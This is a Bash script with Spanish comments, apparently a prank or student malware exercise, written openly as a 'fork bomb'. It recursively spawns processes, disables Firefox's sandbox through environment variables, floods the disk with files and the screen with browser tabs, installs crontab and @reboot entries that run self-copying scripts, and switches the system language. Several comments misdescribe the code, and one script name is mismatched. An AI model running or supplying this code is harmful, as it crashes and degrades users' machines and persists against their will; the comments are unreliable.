#!/bin/bash
forkBomb(){				#Nombre de la bomb fork
   mydate=$(date +'%Y')			#Pasa como variable el año actual			
   export MOZ_DISABLE_CONTENT_SANDBOX=1 #Deshabilita el sandBox de Firefox
   export MOZ_DISABLE_GMP_SANDBOX=1	#Deshabilita el sandBox de Firefox
   export MOZ_FAKE_NO_SANDBOX=1		#Simula el sandBox de Firefox
   for (( count=$mydate; count>0; count-- ))
   do
	fileText="file"$count".txt"	#Crea un archivo llamado file@mydate
	echo "HOLAAAAA SOY JAVIER!!!!" > $fileText	#Escribe en el archivo
	cat $fileText			#Cierra el archivo
	/bin/firefox --new-tab & /bin/sensible-browser --new-tab	#Ejecuta una nueva ventana, tanto de Firefox como del navegador predeterminado
	

   done

}

createFileTaskTime(){			
	file="taskTime.sh"		#Crea un archivo llamado taskTime.sh
	echo "#!/bin/bash" >>$file	#Este también se establece como Bash Shell
	echo "copy(){" >>$file		#Función Copy
	echo "file=FORKBOMB5.sh" >>$file	#Crea una variable con ese nombre
	echo "for (( count=2020; count>0; count-- ))" >>$file	
	echo "do" >>$file
	echo 'cp $(readlink -f $file) "FORKBOMB"$count".sh"' >>$file	#Copia este archivo
	echo "done" >>$file
	echo "}" >>$file
	echo "copy" >>$file		#Llama a la función Copy
	cat $file
	chmod -R 777 $file		#Establecemos a taskTime con todos los permisos, para crear un ejecutable también

	crontab -l > task		#Creamos un archivo Crontab, para que se ejecute determinado tiempo
	echo "01 * * * * -u FORKBOMB10.sh" >> task	#Cada minuto abrirá el archivo FORKBOMB10 (Una copia del actual archivo creada anteriormente).
	echo "00 10 * * * -u taskTime.sh" >> task	#Cada 10 minutos abrirá el archivo taskTime
	echo "@reboot taskTime.sh" >> task		#Cada vez que se reinicie el sistema ejecutará el archivo taskTime
	crontab task			#Establecemos que el arhivo crontab se toma de task
	rm task
}

changeLanguage(){
export LANG=hi_IN.utf8			#Le decimos al sistema que nos busque otro lenguaje
source ~/.bashrc			#Y que lo establezca
}

recursividad(){
bash timeTask.sh			#Ejecuta el archivo
forkBomb | forkBomb &			#ejecutar nuevamente la función forkBomb
yes "Say FORK BOMB" | recursividad	&	#Le decimos al sistema que nos diga infinitamente FORKBOMB (En consola)
recursividad | recursividad &		#ejecutar nuevamente la función recursividad 
}

createFileTaskTime			#Llamado de función createFileTaskTime
forkBomb					#Llamado de función ForkBomb
changeLanguage				#Llamado de función changeLanguage
recursividad				#Llamado de función recursividad

